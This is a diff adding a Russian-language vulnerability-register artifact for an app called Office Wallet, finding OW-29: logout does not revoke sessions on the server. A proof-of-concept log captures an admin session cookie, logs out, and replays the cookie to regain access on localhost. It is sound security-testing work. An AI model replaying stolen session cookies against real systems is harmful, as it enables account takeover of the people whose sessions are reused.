@@ -1,0 +1,21 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-29
+################################################################################################
+== 7. OW-29: выход не отзывает сессию на сервере ==
+    · Logout только ставит пустую куку в браузере (auth.go:64-66) — на сервере
+    · ничего не хранится и не отзывается: кука подписана ключом и живёт, пока
+    · жив браузер. Значит украденная кука работает и после того, как жертва
+    · нажала «Выход», и через год — срока у сессии нет вовсе (OW-29).
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    украденная кука: ow_session=ow.1.admin.888b25bca7475...
+    → GET /logout  (жертва выходит)
+    ← HTTP 302 redirect=http://localhost:18081/login  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Вход · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   <...
+    → GET /  той же кукой ПОСЛЕ выхода
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ┌─ АРТЕФАКТ · OW-29 · cookie не отозвана logout
+    │ GET /logout → браузер получил пустую cookie, копия украденной сохранена
+    │ повторный GET / с прежним ow_session → HTTP 200, кабинет доступен
+    └─
+[+] кука после logout всё ещё открывает кабинет — отзыв только на клиенте
